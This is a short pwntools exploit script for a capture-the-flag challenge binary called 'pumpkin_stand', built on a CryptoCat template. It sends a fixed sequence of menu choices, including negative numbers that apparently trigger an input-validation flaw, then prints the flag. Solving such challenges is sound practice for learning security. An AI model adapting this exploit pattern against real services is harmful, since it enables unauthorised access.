#!/usr/bin/python3
# @author: CryptoCat (https://github.com/Crypto-Cat/CTF/tree/main/pwn)
# Modified by An00bRektn
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Binary filename
exe = './pumpkin_stand'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# Start program
io = start()

# There's probably a faster way to do this
# but I didn't actually reverse anything and hit random
# negative numbers until it worked
io.sendlineafter(b'>>', "1")
io.sendlineafter(b'>>', "1")
io.sendlineafter(b'>>', "-2")
io.sendlineafter(b'>>', "10")
io.sendlineafter(b'>>', "-2")
io.sendlineafter(b'>>', "10")

io.recvuntil(b'\x0a\x0a')
flag = io.recvlineS()

success(flag)